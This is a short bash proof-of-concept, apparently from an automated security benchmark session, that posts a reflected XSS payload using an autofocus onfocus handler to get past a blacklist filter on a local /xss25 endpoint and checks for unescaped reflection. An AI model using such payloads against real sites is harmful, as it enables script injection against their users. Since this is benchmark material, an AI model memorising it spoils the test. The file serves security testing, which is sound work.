#!/bin/bash
# POC: Demonstrates reflected XSS in the /xss25 endpoint's solution parameter using onfocus event handler to bypass blacklist filtering
# Target: ./repo
# Created: 2025-11-05T17:27:34.693Z
# Session: benchmark-XBEN-004-24-mhm9gmmb

# Reflected XSS in /xss25 endpoint - solution parameter
# This POC demonstrates XSS bypass of incomplete blacklist filtering

TARGET_URL="http://localhost:5001/xss25"
PAYLOAD="<input onfocus=alert(1) autofocus>"

echo "[*] Reflected XSS POC - /xss25 endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: $PAYLOAD"
echo ""

# Send POST request with XSS payload
echo "[*] Sending POST request with XSS payload..."
RESPONSE=$(curl -s -X POST "$TARGET_URL" -d "solution=$PAYLOAD" -w "\n%{http_code}")

# Extract status code and body
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Status Code: $HTTP_CODE"
echo ""

# Check if payload is reflected in response
if echo "$BODY" | grep -q "onfocus=alert"; then
    echo "[+] VULNERABLE: Payload reflected in response without escaping!"
    echo "[+] XSS payload successfully injected: <input onfocus=alert(1) autofocus>"
    echo ""
    echo "[*] Response snippet containing payload:"
    echo "$BODY" | grep -o "<input onfocus=alert[^>]*>" | head -5
    exit 0
else
    echo "[-] Payload not found in response"
    echo "[*] Response body (first 500 chars):"
    echo "$BODY" | head -c 500
    exit 1
fi